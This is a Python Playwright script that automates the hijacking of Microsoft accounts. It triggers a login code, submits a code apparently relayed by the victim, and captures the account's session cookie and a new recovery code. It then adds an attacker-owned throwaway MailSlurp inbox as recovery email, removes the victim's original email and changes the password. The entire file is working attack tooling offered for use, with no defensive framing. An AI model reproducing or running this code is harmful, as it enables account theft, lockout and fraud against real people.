import asyncio
import config
import aiohttp
import random
import string
import re
import time
import requests
import json
from playwright.async_api import async_playwright
from playwright.async_api import TimeoutError as PlaywrightTimeoutError
from mailslurp_client import Configuration, ApiClient, WaitForControllerApi
from bs4 import BeautifulSoup

SESSION_TIMEOUT = 300  # 5 minutes in seconds

# Per-user sessions: { user_id: { browser, page, playwright, context, created_at, credential_data, email } }
sessions = {}


def get_user_session(user_id):
    """Returns the session for a user, or None if it doesn't exist or has expired."""
    session = sessions.get(user_id)
    if session is None:
        return None
    if time.time() - session["created_at"] > SESSION_TIMEOUT:
        return None
    return session


async def close_session(user_id):
    """Close and remove a user's browser session."""
    session = sessions.pop(user_id, None)
    if session is None:
        return
    try:
        if session.get("browser"):
            await session["browser"].close()
    except Exception:
        pass
    try:
        if session.get("playwright"):
            await session["playwright"].stop()
    except Exception:
        pass


async def automate_password_reset(email, user_id):
    """Opens a fresh browser session for the given user and starts the OTP flow."""
    # Close any existing session for this user first
    await close_session(user_id)

    config.AUTHVALUE = ""
    config.EMAIL_REENTER = False
    config.MASKED_EMAIL = ""

    pw = await async_playwright().start()
    browser = await pw.chromium.launch(headless=False)
    context = await browser.new_context(
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )
    page = await context.new_page()

    session = {
        "browser": browser,
        "page": page,
        "playwright": pw,
        "context": context,
        "created_at": time.time(),
        "credential_data": None,
        "email": email,
    }
    sessions[user_id] = session

    cdp = await context.new_cdp_session(page)
    await cdp.send("WebAuthn.enable", {"enableUI": False})
    await cdp.send("WebAuthn.addVirtualAuthenticator", {
        "options": {
            "protocol": "ctap2",
            "transport": "internal",
            "hasResidentKey": True,
            "hasUserVerification": True,
            "isUserVerified": False,
            "automaticPresenceSimulation": True,
        }
    })

    async def log_request(route, request):
        print(f"Intercepted request URL: {request.url}")
        if "https://login.live.com/GetCredentialType.srf" in request.url:
            try:
                if request.method == 'POST':
                    request_payload = await request.post_data()
                    print(f"Captured Request Payload: {request_payload}")
                else:
                    print("Non-POST request, no payload.")
            except Exception as e:
                print(f"Error capturing request payload: {e}")
        await route.continue_()

    async def log_response(response):
        if "https://login.live.com/GetCredentialType.srf" in response.url:
            try:
                response_text = await response.text()
                response_json = json.loads(response_text)
                proofs = response_json.get("Credentials", {}).get("OtcLoginEligibleProofs", [])
                if proofs and "data" in proofs[0]:
                    session["credential_data"] = proofs[0]["data"]
                    print(f"Credential Data Captured: {session['credential_data']}")
            except Exception as e:
                print(f"Error parsing response: {e}")

    page.on("response", log_response)
    page.on("route", log_request)

    if not page.url.startswith("https://login.live.com"):
        while True:
            try:
                await page.goto("https://login.live.com")
                await page.get_by_role("textbox", name="Email or phone number").wait_for(timeout=1000)
                break
            except Exception:
                print("Textbox not found, refreshing...")
                await page.reload()

    if not page.url.startswith("https://login.live.com/ppsecure/"):
        await page.get_by_role("textbox", name="Email or phone number").fill(email)
        await page.get_by_test_id("primaryButton").click()
        await page.wait_for_timeout(3000)

    try:
        error_element = page.locator('span:has-text("We couldn\'t find a Microsoft account. Try entering your details again, or create an account.")')
        if await error_element.count() > 0:
            print("Account not found error detected")
            config.ACCOUNT_NOT_FOUND = True
            return False
    except Exception as e:
        print(f"Error checking for account not found message: {e}")

    try:
        other_ways_button = page.get_by_text("Sign in another way")
        await other_ways_button.click()
        if await other_ways_button.count() > 0:
            await other_ways_button.first.click()
            await page.wait_for_timeout(2000)

            email_hidden = False
            try:
                masked_email_element = page.locator('text=We\'ll send a code to')
                if await masked_email_element.count() > 0:
                    masked_email_text = await masked_email_element.inner_text()
                    if "send a code to " in masked_email_text:
                        masked_email = masked_email_text.split("send a code to ")[1]
                        email_hidden = "*" in masked_email
                        config.MASKED_EMAIL = masked_email
                        print(f"Email detected: {masked_email}, Hidden: {email_hidden}")
            except Exception as e:
                print(f"Error checking for masked email: {e}")

            send_code_found = False

            try:
                send_button = page.get_by_role("button", name="Send a code")
                if await send_button.count() > 0:
                    await send_button.first.click()
                    send_code_found = True
                    print("Clicked 'Send a code' button")
            except Exception as e:
                print(f"Error clicking 'Send a code' button: {e}")

            if not send_code_found:
                try:
                    span_selectors = [
                        'span:has-text("Send a code")',
                        'span.fui-Link:has-text("Send a code")',
                        'span[role="button"]:has-text("Send a code")',
                        '[role="button"]:has-text("Send a code")',
                        '.fui-Link:has-text("Send a code")'
                    ]
                    for selector in span_selectors:
                        send_span = page.locator(selector)
                        if await send_span.count() > 0:
                            await send_span.first.click()
                            send_code_found = True
                            print(f"Clicked 'Send a code' span with selector: {selector}")
                            break
                except Exception as e:
                    print(f"Error clicking 'Send a code' span: {e}")

            if send_code_found:
                await page.wait_for_timeout(2000)

                try:
                    email_verify_text = page.locator('text=To verify this is your email, enter it here.')
                    if await email_verify_text.count() > 0:
                        print("Email re-verification required")
                        config.EMAIL_REENTER = True
                        return False
                except Exception as e:
                    print(f"Error checking for email verification message: {e}")

                return True
    except TimeoutError:
        pass

    try:
        email_hidden = False
        try:
            masked_email_element = page.locator('text=We\'ll send a code to')
            if await masked_email_element.count() > 0:
                masked_email_text = await masked_email_element.inner_text()
                if "send a code to " in masked_email_text:
                    masked_email = masked_email_text.split("send a code to ")[1]
                    email_hidden = "*" in masked_email
                    config.MASKED_EMAIL = masked_email
                    print(f"Email detected: {masked_email}, Hidden: {email_hidden}")
        except Exception as e:
            print(f"Error checking for masked email: {e}")

        send_code_found = False

        try:
            send_code_button = page.get_by_role("button", name="Send a code")
            if await send_code_button.count() > 0:
                await send_code_button.first.click()
                send_code_found = True
                print("Clicked 'Send a code' button (direct)")
        except Exception as e:
            print(f"Error clicking 'Send a code' button (direct): {e}")
            if not send_code_found:
                try:
                    span_selectors = [
                        'span:has-text("Send a code")',
                        'span.fui-Link:has-text("Send a code")',
                        'span[role="button"]:has-text("Send a code")',
                        '[role="button"]:has-text("Send a code")',
                        '.fui-Link:has-text("Send a code")'
                    ]
                    for selector in span_selectors:
                        send_span = page.locator(selector)
                        if await send_span.count() > 0:
                            await send_span.first.click()
                            send_code_found = True
                            print(f"Clicked 'Send a code' span with selector: {selector}")
                            break
                except Exception as e:
                    print(f"Error clicking 'Send a code' span: {e}")

                if send_code_found:
                    await page.wait_for_timeout(2000)

                try:
                    email_verify_text = page.locator('text=To verify this is your email, enter it here.')
                    if await email_verify_text.count() > 0:
                        print("Email re-verification required")
                        config.EMAIL_REENTER = True
                        return False
                except Exception as e:
                    print(f"Error checking for email verification message: {e}")

                return True
    except TimeoutError:
        pass

    try:
        email_hidden = False
        try:
            masked_email_element = page.locator('text=We\'ll send a code to')
            if await masked_email_element.count() > 0:
                masked_email_text = await masked_email_element.inner_text()
                if "send a code to " in masked_email_text:
                    masked_email = masked_email_text.split("send a code to ")[1]
                    email_hidden = "*" in masked_email
                    config.MASKED_EMAIL = masked_email
                    print(f"Email detected: {masked_email}, Hidden: {email_hidden}")
        except Exception as e:
            print(f"Error checking for masked email: {e}")

        primary_button = page.get_by_test_id("primaryButton")
        if await primary_button.count() > 0:
            await primary_button.first.click()

            await page.wait_for_timeout(2000)

            try:
                email_verify_text = page.locator('text=To verify this is your email, enter it here.')
                if await email_verify_text.count() > 0:
                    print("Email re-verification required")
                    config.EMAIL_REENTER = True
                    return False
            except Exception as e:
                print(f"Error checking for email verification message: {e}")

            return True
    except TimeoutError:
        pass

    return False


async def automate_auto_change(email, code, newemail, newpass, user_id):
    session = get_user_session(user_id)
    if session is None:
        print(f"Session expired or not found for user {user_id}")
        return "expired"

    page = session["page"]

    try:
        if not newpass:
            newpass = generate_password()
            print(f"Generated new password: {newpass}")

        if code and (not code.isdigit() or len(code) != 6):
            config.INCORRECT_CODE = True
            return False

        if config.AUTHVALUE == "" or code is not None:
            try:
                code_inputs = page.locator('input[aria-label*="Enter code digit"]')
                if await code_inputs.count() > 0:
                    print("Already on code entry page")
                else:
                    print("Not on code entry page, looking for code inputs...")
                    code_inputs = page.locator('input[type="text"][maxlength="1"]')
                    if await code_inputs.count() > 0:
                        print("Found code inputs with alternative selector")
            except Exception as e:
                print(f"Error checking for code entry page: {e}")

            for i, digit in enumerate(code, start=1):
                try:
                    code_input = page.locator(f'input[aria-label*="Enter code digit {i}"]')
                    if await code_input.count() == 0:
                        code_input = page.locator(f'input[name="otc{i}"]')
                    if await code_input.count() == 0:
                        code_input = page.locator(f'input[placeholder*="{i}"]')
                    if await code_input.count() == 0:
                        code_input = code_inputs.nth(i - 1)
                    await code_input.fill(digit)
                except Exception as e:
                    print(f"Error filling code digit {i}: {e}")

            await page.keyboard.press("Enter")
            await asyncio.sleep(2)

            try:
                error_element = page.locator('span:has-text("That code is incorrect. Check the code and try again.")')
                if await error_element.count() > 0:
                    print("Incorrect code detected")
                    config.INCORRECT_CODE = True
                    return False
            except Exception as e:
                print(f"Error checking for incorrect code message: {e}")

        try:
            ok_button = await page.wait_for_selector(
                'button.ms-Button.ms-Button--primary:has-text("OK")', timeout=5000
            )
            await ok_button.click()
        except Exception:
            pass

        ok_button = await page.query_selector("button[name='OK']")
        if ok_button:
            await ok_button.click()
        secondary_button = await page.query_selector("[data-testid='primaryButton']")
        if secondary_button:
            await secondary_button.click()

        await page.wait_for_load_state('load')
        ctx = page.context
        cookies = await ctx.cookies()

        for cookie in cookies:
            if cookie['name'] == '__Host-MSAAUTHP':
                print(f"Cookie __Host-MSAAUTHP: {cookie['value']}")
                config.LastCookie = {cookie['value']}

        await asyncio.sleep(15)

        try:
            close_button = page.locator('#landing-page-dialog\\.close')
            await close_button.wait_for(state="visible", timeout=100000)
            await close_button.click()
            print("Clicked close button with ID selector")
        except Exception as e:
            print(f"ID selector failed: {e}")
            try:
                close_button = page.locator('button[aria-label="Close"]')
                await close_button.wait_for(state="visible", timeout=5000)
                await close_button.click()
                print("Clicked close button with aria-label")
            except Exception as e2:
                print(f"aria-label selector failed: {e2}")
                try:
                    close_button = page.locator('[data-bi-id="landing-page-dialog.close"]')
                    await close_button.wait_for(state="visible", timeout=5000)
                    await close_button.click()
                    print("Clicked close button with data-bi-id")
                except Exception as e3:
                    print(f"All close button attempts failed: {e3}")

        security_drawer_locator = page.locator("[id=\"home\\.drawers\\.security\"] > div > div > div > div > div > div > div > div")
        await security_drawer_locator.wait_for(state="visible", timeout=50000)
        await security_drawer_locator.click()

        additional_security_text_locator = page.locator("text=Additional security options")
        await additional_security_text_locator.nth(1).wait_for(state="visible", timeout=10000)
        await additional_security_text_locator.nth(1).scroll_into_view_if_needed()
        await additional_security_text_locator.nth(1).click()

        await handle_recovery_code(page)

        await page.locator("#AddProofLink").click()
        await page.locator("#Add_email").click()
        await page.get_by_placeholder("someone@example.com").fill(newemail)
        await page.click('input.btn.btn-block.btn-primary#iNext')

        security_code = get_security_code_by_email(config.MAILSLURP_API_KEY, newemail)
        await page.fill("#iOttText", security_code)
        await page.click("#iNext")

        async def click_if_stuck(stop_event):
            while not stop_event.is_set():
                try:
                    await asyncio.sleep(10)
                    if stop_event.is_set():
                        break
                    btn = page.locator('button#iBtn_action')
                    if await btn.count() > 0 and await btn.is_visible():
                        await btn.click()
                        print("Auto-clicked iBtn_action (stuck detection)")
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    print(f"Stuck watcher error: {e}")

        stop_event = asyncio.Event()
        stuck_watcher = asyncio.create_task(click_if_stuck(stop_event))

        try:
            await page.locator('#Email0').click()
            print("Clicked Email0 div")

            await page.wait_for_selector('#Email0 #Remove', timeout=5000)
            await page.locator('#Email0 #Remove').click()
            print("Clicked Remove button")

            try:
                await page.wait_for_selector('button#iBtn_action', timeout=5000)
                await asyncio.sleep(1)
                await page.evaluate("document.querySelector('button#iBtn_action').click()")
                print("Clicked confirmation button (iBtn_action) via JS")
            except Exception:
                pass

            try:
                await page.wait_for_selector('button#iBtn_action', timeout=5000)
                await asyncio.sleep(1)
                await page.evaluate("document.querySelector('button#iBtn_action').click()")
                print("Clicked confirmation button (iBtn_action) via JS")
            except Exception:
                confirmation_selectors = [
                    'button:has-text("Remove")',
                    'button:has-text("Yes")',
                    'button:has-text("OK")'
                    'button:has-text("Ok")'
                    'button:has-text("Confirm")',
                    '.ms-Button--primary:has-text("Remove")',
                    '[data-bi-id*="remove"]',
                    'button.ms-Button--primary'
                ]
                for selector in confirmation_selectors:
                    try:
                        confirmation_button = page.locator(selector)
                        if await confirmation_button.count() > 0 and await confirmation_button.is_visible():
                            await confirmation_button.first.click()
                            print(f"Clicked confirmation with selector: {selector}")
                            break
                    except Exception as e:
                        print(f"Failed with selector {selector}: {e}")

        finally:
            stop_event.set()
            stuck_watcher.cancel()
            try:
                await stuck_watcher
            except asyncio.CancelledError:
                pass

        try:
            backdrop = page.locator('.modal-backdrop')
            if await backdrop.count() > 0:
                await page.keyboard.press("Escape")
                await asyncio.sleep(1)
                if await backdrop.count() > 0:
                    await page.mouse.click(10, 10)
                    await asyncio.sleep(1)
                if await backdrop.count() > 0:
                    await page.evaluate("document.querySelectorAll('.modal-backdrop').forEach(el => el.remove())")
                    await page.evaluate("document.body.classList.remove('modal-open')")
                    print("Removed modal backdrop via JavaScript")
                await asyncio.sleep(1)
        except Exception as e:
            print(f"Error dismissing modal backdrop: {e}")

        try:
            password_section_exists = await page.locator('a[aria-label="Enter password"]').count() > 0
            if not password_section_exists:
                print("Password section not found, clicking to add it")
                await page.locator('a[aria-label="Enter password"]').click()
                await asyncio.sleep(2)

            await page.locator('#ChangePassword').click()
            print("Clicked Change password button")

            await page.fill('#iPassword', newpass)
            await page.fill('#iRetypePassword', newpass)
            print("Filled password fields")

            await page.click('#UpdatePasswordAction')
            print("Clicked Save button to update password")

            await asyncio.sleep(3)

            try:
                success_element = await page.locator('.ms-MessageBar:has-text("Your password has been updated")').count() > 0
                if success_element:
                    print("Password updated successfully")
                else:
                    print("Password update status unclear")
            except Exception:
                print("Could not verify password update status")

        except Exception as e:
            print(f"Error in password change process: {e}")
            await page.screenshot(path="password_change_debug.png")

    except Exception as e:
        print(f"An error occurred in automate_auto_change: {e}")
        print("Keeping browser open for 60 seconds for manual inspection...")
        await asyncio.sleep(60)

    finally:
        print("Waiting 10 seconds before closing browser...")
        await asyncio.sleep(10)
        await close_session(user_id)


async def handle_recovery_code(page):
    try:
        print("Attempting to find and click the 'Generate a new code' link...")

        recovery_link_locator = page.locator("#RecoveryCodeLink")
        await recovery_link_locator.wait_for(state="visible", timeout=10000)
        await recovery_link_locator.click()
        print("Clicked 'Generate a new code' link.")

        modal_locator = page.locator("#ModalContent")
        await modal_locator.wait_for(state="visible", timeout=10000)
        print("Recovery code modal is visible.")

        print("Waiting for the recovery code to be generated and displayed...")
        code_locator = modal_locator.get_by_text(re.compile(r"[A-Z0-9-]{16,}"))
        await code_locator.wait_for(state="visible", timeout=15000)

        recovery_code = await code_locator.inner_text()
        print(f"Successfully captured recovery code: {recovery_code}")

        config.LastRecoveryCode = recovery_code

        await page.get_by_role("button", name="Got it").click()
        print("Closed the recovery code modal.")

    except PlaywrightTimeoutError as e:
        print(f"ERROR: Timed out waiting for a recovery code element. {e}")
        await page.screenshot(path="recovery_code_timeout_error.png")
        try:
            if await modal_locator.count() > 0:
                modal_html = await modal_locator.inner_html()
                print(f"Modal HTML at time of timeout: {modal_html}")
        except Exception as html_e:
            print(f"Could not get modal HTML: {html_e}")
        raise

    except Exception as e:
        print(f"An unexpected error occurred in handle_recovery_code: {e}")
        await page.screenshot(path="recovery_code_unexpected_error.png")
        raise


def get_security_code_by_email(api_key, email_address, timeout=90000):
    if "@" in email_address:
        inbox_id = email_address.split("@")[0]
    else:
        inbox_id = email_address

    cfg = Configuration()
    cfg.api_key['x-api-key'] = api_key

    with ApiClient(cfg) as api_client:
        wait_api = WaitForControllerApi(api_client)
        start_time = time.time()

        while time.time() - start_time < timeout / 1000:
            try:
                email = wait_api.wait_for_latest_email(
                    inbox_id=inbox_id,
                    timeout=5000
                )

                if email:
                    soup = BeautifulSoup(email.body, "html.parser")
                    security_text = soup.find(
                        string=lambda text: text and "Security code:" in text
                    )
                    if security_text:
                        code_span = security_text.find_next('span')
                        if code_span:
                            security_code = code_span.get_text().strip()
                            print(f"Found security code: {security_code}")
                            return security_code
                    print("Security code pattern not found in email")
                    return None

            except Exception as e:
                if "No emails found" in str(e):
                    print("No new email found. Retrying...")
                    time.sleep(5)
                else:
                    print(f"An error occurred: {e}")
                    return None

        print("Timeout reached without finding a security code.")
        return None


def generate_password(length=16):
    if length < 8:
        raise ValueError("Password length must be at least 8 characters.")

    uppercase = string.ascii_uppercase
    lowercase = string.ascii_lowercase
    digits = string.digits
    symbols = "!@#$%^&*()-_=+[]{}|;:,.<>?/~`"

    password = [
        random.choice(uppercase),
        random.choice(lowercase),
        random.choice(digits),
        random.choice(symbols)
    ]

    all_characters = uppercase + lowercase + digits + symbols
    password += random.choices(all_characters, k=length - 4)
    random.shuffle(password)

    return ''.join(password)


async def CreateRandomEmail():
    BASE_URL = "https://api.mailslurp.com"
    headers = {
        "Content-Type": "application/json",
        "x-api-key": config.MAILSLURP_API_KEY
    }
    url = f"{BASE_URL}/inboxes"

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        async with session.post(url, headers=headers) as response:
            if response.status == 201:
                inbox = await response.json()
                print(f"Email Address Generated: {inbox['emailAddress']}")
                return inbox['emailAddress']
            else:
                error_text = await response.text()
                raise Exception(f"Failed to create inbox: {response.status} - {error_text}")


async def fill_and_press(page, selector, text):
    await page.fill(selector, text)
    await page.press(selector, "Enter")


async def continue_password_reset(user_id):
    session = get_user_session(user_id)
    if session is None:
        return "expired"

    page = session["page"]

    try:
        await page.wait_for_timeout(3000)

        try:
            code_input = page.locator('input[aria-label*="Enter code digit"]')
            if await code_input.count() > 0:
                print("Already on code entry page")
                return True
        except Exception as e:
            print(f"Error checking for code entry page: {e}")

        try:
            already_button = page.get_by_role("button", name="Already received a code?")
            if await already_button.count() > 0:
                await already_button.first.click()
                await page.wait_for_timeout(2000)
                print("Clicked 'Already received a code?' button")
                return True
        except Exception as e:
            print(f"Error clicking 'Already received a code?' button: {e}")

        try:
            primary_button = page.get_by_test_id("primaryButton")
            if await primary_button.count() > 0:
                await primary_button.first.click()
                await page.wait_for_timeout(2000)
                print("Clicked primary button")
                return True
        except Exception as e:
            print(f"Error clicking primary button: {e}")

        try:
            continue_buttons = page.locator('button:has-text("Continue"), button:has-text("Next"), button:has-text("Send")')
            if await continue_buttons.count() > 0:
                await continue_buttons.first.click()
                await page.wait_for_timeout(2000)
                print("Clicked continue/next/send button")
                return True
        except Exception as e:
            print(f"Error clicking continue button: {e}")

        print("Waiting for code to be sent...")
        await page.wait_for_timeout(5000)

        try:
            code_input = page.locator('input[aria-label*="Enter code digit"]')
            if await code_input.count() > 0:
                print("Code entry page detected after waiting")
                return True
        except Exception as e:
            print(f"Error checking for code entry page after waiting: {e}")

        print("Could not continue to code entry page")
        return False
    except Exception as e:
        print(f"Error in continue_password_reset: {e}")
        return False
